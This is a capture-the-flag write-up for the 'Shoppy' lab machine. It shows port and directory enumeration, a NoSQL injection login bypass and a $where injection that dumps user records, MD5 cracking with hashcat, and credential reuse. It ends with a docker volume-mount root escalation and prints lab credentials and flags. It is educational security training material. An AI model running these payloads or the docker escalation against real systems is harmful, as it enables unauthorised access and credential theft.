# Shoppy

Created by: John Patterson
Created time: March 11, 2023 12:35 PM
Last edited by: John Patterson
Last edited time: March 11, 2023 6:26 PM
Tags: write-up

## System

IP Address: **10.10.11.180**

Hostname: **shoppy.htb**

## Discovery

After a quick port scan we see SSH and HTTP open:

```jsx
$ sudo nmap -sV shoppy.htb      
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.23.1
```

After curling the HTTP page, we see the following:

```jsx
<h1 id="countdown">
  Shoppy beta coming soon ! Stay tuned for beta access !
</h1>
```

This could mean there’s a dev/beta page on a sub-domain or path. There aren’t any links to other pages or domains, so we’ll need to enumerate using a dictionary.

```jsx
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
    --url http://shoppy.htb
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/exports              (Status: 301) [Size: 181] [--> /exports/]
```

```jsx
$ gobuster vhost --append-domain --domain shoppy.htb -u http://shoppy.htb \
    -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt
Found: mattermost.shoppy.htb Status: 200 [Size: 3122]
```

A login page seems promising. A quick inspection of the headers and `<head>` content of the `/login` page doesn’t show anything interesting. I tried some common `admin` login combinations to no avail. Let’s probe for SQL injection. Sending a single quote in the POST form causes the request to timeout:

```jsx
POST /login HTTP/1.1
Host: shoppy.htb
Content-Type: application/x-www-form-urlencoded

username=user'&password=password
```

A couple of SQLi attempts aren’t going anywhere. Each request times out. We can try NoSQL injection and see if get further:

```jsx
POST /login HTTP/1.1
Host: shoppy.htb
Content-Type: application/x-www-form-urlencoded

username=user' || 'foo'='foo&password=password
```

Which returns a cookie and a redirect to the `/admin` page!

```jsx
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: connect.sid=s%3A4AWG2sjZxaoHw_hyygOmNoutwEn73IrI.ZqV4bJjzxmBvj9qQ%2FQCJvTC%2Fjp1ZuN82gVWqILCDg1w; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/admin">/admin</a></p>
```

## Shoppy Admin

Now that we are in the shoppy site, the only visible option for interaction is a “Search for users” button, which gives us a form and makes the following request:

```jsx
GET /admin/search-users?username=admin HTTP/1.1
Host: shoppy.htb
```

This returns a link to view some exported data and brings us to `[http://shoppy.htb/exports/export-search.json](http://shoppy.htb/exports/export-search.json)` with the following content:

```jsx
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
```

I can’t login to the shoppy admin portal with that raw value. At first glance it doesn’t appear like a hash. We’ll file that away for further investigation. I want to know if there are any other users. Since we know there is some sort of NoSQL database backing this, let’s see if we can inject the `username` parameter:

```jsx
GET /admin/search-users?username='

HTTP/1.1 500 Internal Server Error
```

Looks promising. Let’s figure out a query to enumerate. For mongodb, a simple search function that accepts a username is likely using a `$where` statement. An example of this would be:

```jsx
db.users.find({ $where: `this.username == '${username}'` });
```

This gives us a way to think about crafting. We can enumerate the remaining users with the following query:

```jsx
GET /admin/search-users?username='; this.username != 'admin
```

Which returns an exported list of another user:

```jsx
[{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

Now that we’ve enumerated the users, let’s start evaluating these passwords. I put both passwords in a `hashes.txt` file and let hashcat try and detect their type:

```jsx
$ hashcat --identify hashes.txt                                     
The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
```

They resemble md5 to me as well, so lets try that:

```jsx
$ hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz
...
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Recovered........: 1/2 (50.00%) Digests (total), 0/2 (0.00%) Digests (new)6
$ hashcat -m 0 --show hashes.txt
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

**************************Credentials:************************** `josh`/ `remembermethisway`

## User Shell

We know from earlier, ssh is open to the system, however he didn’t reuse his shoppy password. We also found another sub-domain, `mattermost.shoppy.htb`. Browsing there, we a presented a login page. That same combination was used here too.

Browsing the channels, we see an interesting conversation between `josh` and `jaeger`.

```jsx
josh: Hey @jaeger, when I was trying to install docker on the machine, I started learn C++ and I do a password manager. You can test it if you want, the program is on the deploy machine.
jaeger: Nice, I will take a look at it
```

There’s another conversation between them where jaeger shares some credentials:

![Shoppy Chat](image/shoppy-chat.png)

**********************Credentials**********************: `jaeger` / `Sh0ppyBest@pp!`

We also learn that docker is being used for deployments. After poking around we see another user, `jess` , who shares about her cat, `Tigrou`. I checked for any additional channels or users, but that seemed like it.

Let’s try ssh’ing into shoppy.htb using `jaeger`.

```bash
$ ssh jaeger@shoppy.htb 
jaeger@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ cat user.txt
c31febe115dc3fb728b5435cd1ad9b1f
```

I started poking around the env and directories and found another user, `deploy`. We read in the exchange between `jaeger` and `josh` that docker is being used for deployment. Running docker and listing the running containers gives us a `permission denied`. Perhaps we can use `sudo` to escalate.

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Sorry, try again.
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

`/home/deploy/password-manager` appears to the C++ program `josh` talked about developing in the chat. We aren’t able to read the source, but executing it as the `deploy` user, we are greeted with a prompt:

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sh0ppyBest@pp!
Access denied! This incident will be reported !
```

Well it’s not the same password. I also generated some noise. It’s an early iteration of a custom app by a new-ish developer. Let’s copy the app to our local machine and decompile it. Searching for how to decompile c++, I came across some tools to use. I’ll try my luck with `ghidra`.

Analyzing the program shows there’s a hardcoded string comparison used for logging in. The master password appears to be `Sample` . It doesn’t appear that the “incident reporting” will do anything, so we’re safe there. The last interesting piece is after logging in, it will dump the file `/home/deploy/creds.txt`. Let’s test our assumptions:

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

## Escalating

I’m going to login with the `deploy` user:

```bash
jaeger@shoppy:~$ su - deploy
Password: 
$ bash
deploy@shoppy:~$

```

The deploy user surely has more permissions than `jaeger`. The deploy user can’t run sudo. Maybe docker?

```bash
deploy@shoppy:~$ docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

I can access the docker server, but there aren’t any running or stopped containers. I searched the filesystem for a `Dockerfile` in hopes of finding some hints, but fell short of anything useful. There appears to be a single image pulled, `alpine`. I searched for `docker cves` on google. There are a few vulnerabilities we can explore based on our docker version:

```bash
Server: Docker Engine - Community
 Engine:
  Version:          20.10.18
  API version:      1.41 (minimum version 1.12)
  Go version:       go1.18.6
  Git commit:       e42327a
  Built:            Thu Sep  8 23:09:59 2022
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.8
  GitCommit:        9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

I don’t see any exact matches for our version. GTFOBins has a couple of things we can try ([https://gtfobins.github.io/gtfobins/docker/#shell](https://gtfobins.github.io/gtfobins/docker/#shell))

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# bash
root@485b116ac101:/mnt# ls /home
deploy	jaeger
```

This effectively gives us root on the host system through the shared mount point. Pretty clever. Let’s get the flag:

```bash
$ cat /root/root.txt
254e2008ee86a5bf47f373a99d7110a9
```
